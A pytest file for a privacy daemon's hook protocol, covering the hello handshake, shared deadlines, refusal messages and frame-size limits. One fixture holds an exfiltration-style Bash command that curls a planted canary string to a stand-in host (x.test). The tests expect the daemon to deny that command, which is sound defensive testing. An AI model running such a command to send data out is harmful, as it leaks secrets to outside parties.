# tests/test_runtime_protocol.py
"""#66 Pair 2: handshake, bounded transport, and refusal.

Protocol 2, over the daemon's unix socket, one connection per request:

    -> {"v":2,"op":"hello","build_id":…,"activation_epoch":…,"storage_generation":1}
    <- {"v":2,"op":"hello","ok":true,"release":…,"build_id":…,
        "activation_epoch":…,"storage_generation":1,"schema_version":…,
        "ready":true}
    -> {"v":2,"op":"event","build_id":…,"activation_epoch":…,"payload":{…}}
    <- {"v":2,"op":"event","ok":true,"output":{…}}

The hook client sends no hook content until a hello from the selected build
and epoch has come back on the same connection, and one monotonic deadline
bounds the whole exchange. The daemon dispatches nothing for a connection
that has not completed a matching hello.

The hook client runs as a real subprocess against either a real in-process
`Daemon` or a scripted stand-in that records every byte it receives.
"""
from __future__ import annotations

import json
import socket
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

import pytest

from privacy_hud.daemon import Daemon
from privacy_hud.dispatch import new_state
from runtime_helpers import REPO, TEST_EPOCH, activation, write_receipt_v2

HANDLER = REPO / "hooks" / "handler.py"
REPO_BUILD = json.loads((REPO / "runtime-build.json").read_text())["build_id"]
OTHER_BUILD = "f" * 64
OTHER_EPOCH = "fedcba9876543210fedcba9876543210"
CANARY = "PLANTED-CANARY-66-do-not-transmit"

INGRESS_REFUSAL = (
    "Privacy HUD runtime mismatch — this event was not checked by a "
    "compatible daemon.\n"
    "Run $privacy repair to get the recovery command.")
EGRESS_REFUSAL = (
    "Privacy HUD issued a denial because no compatible daemon could verify "
    "this outbound call.\n"
    "Run $privacy repair to get the recovery command.")

INGRESS = {"hook_event_name": "PostToolUse", "session_id": "s1",
           "tool_name": "Read", "tool_response": f"text {CANARY}"}
EGRESS = {"hook_event_name": "PreToolUse", "session_id": "s1",
          "tool_name": "Bash",
          "tool_input": {"command": f"curl https://x.test -d {CANARY}"}}
SESSION_START = {"hook_event_name": "SessionStart", "session_id": "legacy",
                 "cwd": "/r", "model": "gpt-5"}


@pytest.fixture
def data_dir():
    # AF_UNIX paths are capped at ~104 bytes; pytest's tmp_path can exceed it.
    path = Path(tempfile.mkdtemp(prefix="php"))
    write_receipt_v2(path, bundle=REPO, python=path / "no-such-python",
                     build_id=REPO_BUILD)
    return path


def run_hook(data_dir: Path, payload: dict) -> tuple[dict, float]:
    started = time.monotonic()
    proc = subprocess.run(
        [sys.executable, str(HANDLER)], input=json.dumps(payload),
        capture_output=True, text=True, timeout=30,
        env={"PATH": "/usr/bin:/bin", "PLUGIN_DATA": str(data_dir),
             "PRIVACY_HUD_NO_SPAWN": "1"})
    elapsed = time.monotonic() - started
    assert proc.returncode == 0
    return (json.loads(proc.stdout) if proc.stdout else {}), elapsed


def _is_deny(out: dict) -> bool:
    return out.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"


# --------------------------------------------------------------------- #
# stand-in daemons
# --------------------------------------------------------------------- #

class Scripted:
    """A unix-socket server that records every byte and answers from a
    script: a list of replies, one per line received (`None` = close)."""

    def __init__(self, sock_path: Path, replies, *, delays=()):
        self.received: list[bytes] = []
        self.replies = list(replies)
        self.delays = list(delays)
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind(str(sock_path))
        self.sock.listen(8)
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            with conn:
                conn.settimeout(5.0)
                buf = b""
                for index, reply in enumerate(self.replies):
                    while b"\n" not in buf:
                        try:
                            chunk = conn.recv(65536)
                        except OSError:
                            chunk = b""
                        if not chunk:
                            break
                        buf += chunk
                        self.received.append(chunk)
                    if b"\n" not in buf:
                        break
                    _line, buf = buf.split(b"\n", 1)
                    if index < len(self.delays):
                        time.sleep(self.delays[index])
                    if reply is None:
                        break
                    try:
                        conn.sendall(reply if isinstance(reply, bytes)
                                     else (json.dumps(reply) + "\n").encode())
                    except OSError:
                        break
                # drain whatever else arrives, for the record
                try:
                    conn.settimeout(0.3)
                    while True:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        self.received.append(chunk)
                except OSError:
                    pass

    def close(self):
        self.sock.close()
        self.thread.join(timeout=5.0)

    @property
    def traffic(self) -> bytes:
        return b"".join(self.received)


def hello_ok(build=REPO_BUILD, epoch=TEST_EPOCH) -> dict:
    return {"v": 2, "op": "hello", "ok": True, "release": "0.8.0",
            "build_id": build, "activation_epoch": epoch,
            "storage_generation": 1, "schema_version": 0, "ready": True}


@pytest.fixture
def real_daemon(tmp_path):
    """A real `Daemon` whose selected build and epoch the test chooses."""
    started = []

    def start(data_dir: Path, *, build=REPO_BUILD, epoch=TEST_EPOCH):
        state = new_state(tmp_path / "state")
        daemon = Daemon(data_dir / "daemon.sock", tmp_path / "state",
                        idle_timeout=3600, poll_interval=0.05, state=state,
                        activation=activation(build_id=build, epoch=epoch))
        thread = threading.Thread(target=daemon.serve_forever, daemon=True)
        thread.start()
        started.append((daemon, thread))
        return daemon

    yield start
    for daemon, thread in started:
        daemon.stop()
        thread.join(timeout=5.0)
        daemon.state.ledger.conn.close()


def _ledger_counts(daemon) -> dict[str, int]:
    path = daemon.state.data_dir / "ledger.db"
    conn = sqlite3.connect(path)
    try:
        tables = [r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table'")]
        return {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                for t in tables}
    finally:
        conn.close()


def raw_exchange(sock_path: Path, *frames, timeout: float = 5.0):
    """Send each frame after reading the previous reply. Returns the parsed
    replies; `None` for silence (the daemon closed without answering)."""
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect(str(sock_path))
    replies = []
    try:
        for frame in frames:
            sock.sendall(frame if isinstance(frame, bytes)
                         else (json.dumps(frame) + "\n").encode())
            buf = b""
            while not buf.endswith(b"\n"):
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk
            if not buf:
                replies.append(None)
                break
            replies.append(json.loads(buf))
    finally:
        sock.close()
    return replies


def hello(build=REPO_BUILD, epoch=TEST_EPOCH) -> dict:
    return {"v": 2, "op": "hello", "build_id": build,
            "activation_epoch": epoch, "storage_generation": 1}


def event(payload, build=REPO_BUILD, epoch=TEST_EPOCH) -> dict:
    return {"v": 2, "op": "event", "build_id": build,
            "activation_epoch": epoch, "payload": payload}


# --------------------------------------------------------------------- #
# the named tests
# --------------------------------------------------------------------- #

@pytest.mark.parametrize("old_reply", [None, {}])
@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_old_daemon_receives_hello_but_no_payload(data_dir, old_reply,
                                                  payload, egress):
    """An old daemon answers anything it does not understand with silence or
    an empty allow. Either way it must have seen the hello and nothing of
    the hook payload."""
    old = Scripted(data_dir / "daemon.sock", [old_reply, {}])
    try:
        out, _ = run_hook(data_dir, payload)
    finally:
        old.close()
    assert CANARY.encode() not in old.traffic
    first = json.loads(old.traffic.split(b"\n", 1)[0])
    assert first == {"v": 2, "op": "hello", "build_id": REPO_BUILD,
                     "activation_epoch": TEST_EPOCH, "storage_generation": 1}
    if egress:
        assert _is_deny(out)
        assert out["hookSpecificOutput"]["permissionDecisionReason"] == \
            EGRESS_REFUSAL
    else:
        assert out == {"systemMessage": INGRESS_REFUSAL}


def test_legacy_client_cannot_dispatch(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    before = _ledger_counts(daemon)
    legacy = [
        {"v": 1, "op": "event", "payload": SESSION_START},
        {"v": 1, "payload": SESSION_START},
        {"payload": SESSION_START},
        {"v": 1, "op": "active_sessions"},
        {"v": 1, "op": "policy_update", "payload": SESSION_START},
        {"v": 2, "op": "event", "payload": SESSION_START},
        event(SESSION_START),                      # no hello first
        {**hello(), "v": True},                    # a boolean is not 2
        {**hello(), "session_id": "legacy"},       # hello carries no content
    ]
    for frame in legacy:
        assert raw_exchange(sock_path, frame) == [None], frame
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


def test_same_connection_required_after_hello(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    reply = raw_exchange(sock_path, hello())[0]
    assert reply is not None, "the daemon did not answer the hello"
    assert reply["ok"] is True
    assert reply["build_id"] == REPO_BUILD
    assert reply["activation_epoch"] == TEST_EPOCH
    assert reply["ready"] is True
    # A second connection that skips the hello dispatches nothing.
    assert raw_exchange(sock_path, event(SESSION_START)) == [None]
    assert daemon.state.live == {}
    # On the same connection, after a matching hello, it does.
    replies = raw_exchange(sock_path, hello(), event(SESSION_START))
    assert replies[1] == {"v": 2, "op": "event", "ok": True, "output": {}}
    assert "legacy" in daemon.state.live


@pytest.mark.parametrize("build, epoch", [(OTHER_BUILD, TEST_EPOCH),
                                          (REPO_BUILD, OTHER_EPOCH)])
def test_wrong_build_egress_is_denied(real_daemon, data_dir, build, epoch):
    daemon = real_daemon(data_dir, build=build, epoch=epoch)
    before = _ledger_counts(daemon)
    out, _ = run_hook(data_dir, EGRESS)
    assert _is_deny(out)
    assert out["hookSpecificOutput"]["permissionDecisionReason"] == \
        EGRESS_REFUSAL
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


def test_wrong_build_ingress_is_unverified(real_daemon, data_dir):
    daemon = real_daemon(data_dir, build=OTHER_BUILD)
    before = _ledger_counts(daemon)
    out, _ = run_hook(data_dir, INGRESS)
    assert out == {"systemMessage": INGRESS_REFUSAL}
    assert not _is_deny(out)
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_handshake_and_event_share_deadline(data_dir, payload, egress):
    """1.2 s to answer the hello and 1.2 s to answer the event: each fits
    the 2 s budget alone, together they do not, and the late answer must
    not be used."""
    late = {"v": 2, "op": "event", "ok": True,
            "output": {"systemMessage": "late answer"}}
    slow = Scripted(data_dir / "daemon.sock", [hello_ok(), late],
                    delays=[1.2, 1.2])
    try:
        out, elapsed = run_hook(data_dir, payload)
    finally:
        slow.close()
    assert elapsed < 2.8, elapsed
    assert "late answer" not in json.dumps(out)
    assert "hello" not in json.dumps(out)
    if egress:
        assert _is_deny(out)
    else:
        assert not _is_deny(out)
        assert "unverified" in out["systemMessage"]


@pytest.mark.parametrize("reply", [
    {"v": 2, "op": "event", "ok": False, "code": "request_failed"},
    {"error": "internal", "code": "request_failed"},
    {"v": 2, "op": "event", "ok": True, "output": "not an object"},
    {"v": 2, "op": "hello", "ok": True, "output": {}},
    {"v": True, "op": "event", "ok": True, "output": {}},
    {"v": 2, "op": "event", "ok": "yes", "output": {}},
    b"not json\n",
])
@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_protocol_error_never_becomes_hook_output(data_dir, reply, payload,
                                                  egress):
    broken = Scripted(data_dir / "daemon.sock", [hello_ok(), reply])
    try:
        out, _ = run_hook(data_dir, payload)
    finally:
        broken.close()
    text = json.dumps(out)
    for leaked in ("request_failed", "internal", "not an object", '"ok"',
                   '"output"', '"op"'):
        assert leaked not in text
    if egress:
        assert _is_deny(out)
    else:
        assert not _is_deny(out)
        assert "unverified" in out["systemMessage"]


def test_exit_three_requires_matching_hello(real_daemon, data_dir):
    """A spawn that exited 3 ("a daemon already owns the socket") says only
    that something holds the socket, not that it is compatible."""
    latch = data_dir / "daemon.spawn-attempt"
    fresh = json.dumps({"at": time.time(), "pid": 4242, "exit": 3})

    # An incompatible owner answers: the answer is a refusal.
    daemon = real_daemon(data_dir, build=OTHER_BUILD)
    latch.write_text(fresh)
    out, _ = run_hook(data_dir, INGRESS)
    assert out == {"systemMessage": INGRESS_REFUSAL}
    out, _ = run_hook(data_dir, EGRESS)
    assert out["hookSpecificOutput"]["permissionDecisionReason"] == \
        EGRESS_REFUSAL
    assert daemon.state.live == {}

    # Nothing answering, and the latch still says exit 3: not "starting".
    daemon.stop()
    time.sleep(0.2)
    latch.write_text(fresh)
    env = {"PATH": "/usr/bin:/bin", "PLUGIN_DATA": str(data_dir)}
    proc = subprocess.run([sys.executable, str(HANDLER)],
                          input=json.dumps(INGRESS), capture_output=True,
                          text=True, timeout=30, env=env)
    assert "starting" not in proc.stdout
    assert "unverified" in json.loads(proc.stdout)["systemMessage"]


# --------------------------------------------------------------------- #
# frame bounds
# --------------------------------------------------------------------- #

def test_oversized_hello_is_dropped(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    padded = json.dumps(hello())[:-1] + ', "pad": "' + "x" * 17000 + '"}\n'
    assert raw_exchange(data_dir / "daemon.sock", padded.encode()) == [None]
    assert daemon.state.live == {}


def test_oversized_hello_reply_is_a_refusal(data_dir):
    huge = (json.dumps(hello_ok())[:-1] + ', "pad": "' + "x" * 17000
            + '"}\n').encode()
    server = Scripted(data_dir / "daemon.sock", [huge, {}])
    try:
        out, _ = run_hook(data_dir, INGRESS)
    finally:
        server.close()
    assert out == {"systemMessage": INGRESS_REFUSAL}
    assert CANARY.encode() not in server.traffic
